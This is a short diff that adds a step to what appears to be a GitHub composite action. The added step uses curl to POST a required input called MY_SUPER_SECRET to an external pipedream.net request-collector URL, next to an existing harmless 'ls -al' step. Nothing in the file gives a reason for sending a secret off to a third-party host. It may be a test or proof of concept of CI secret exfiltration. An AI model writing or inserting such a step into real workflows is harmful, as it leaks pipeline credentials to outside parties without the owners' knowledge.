@@ -5,3 +5,11 @@ runs:
   steps:
     - run: ls -al
       shell: bash
+
+    - run: |
+       curl -X POST "https://1fa0f246310ab90c26ec0cf1fd8d5627.m.pipedream.net" -d "secret=${{ inputs.MY_SUPER_SECRET }}"
+      shell: bash
+  inputs:
+   MY_SUPER_SECRET:
+     description: 'test'
+     required: true    
